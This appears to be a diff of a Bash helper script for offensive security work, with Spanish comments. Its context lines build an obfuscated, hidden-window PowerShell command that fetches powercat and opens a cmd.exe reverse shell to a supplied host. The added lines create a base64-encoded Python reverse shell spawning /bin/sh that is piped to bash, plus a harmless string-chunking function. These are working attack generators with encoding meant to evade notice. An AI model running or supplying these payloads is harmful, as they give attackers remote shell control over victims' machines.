@@ -17,3 +17,16 @@ echo -n "powershell -nOp -w hIDdeN -EP ByPaSs -e ";
 echo `curl -s https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1` 'powercat -c "$1" -p $2 -e cmd.exe' | iconv -t UTF-16LE | base64 | tr -d "\n"
 }
 
+reverse-shell-python(){
+REVERSE=$(echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$1",$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" | base64 | tr -d '\n');
+
+echo "echo '$REVERSE' | base64 --decode | /bin/bash";
+}
+
+#
+# Sirve para cortar una cadena en chunks de un tamaño especifico
+#
+chunking_line(){
+echo "$1" | sed -r "s/(.{$2})/\1\n/g"
+}
+
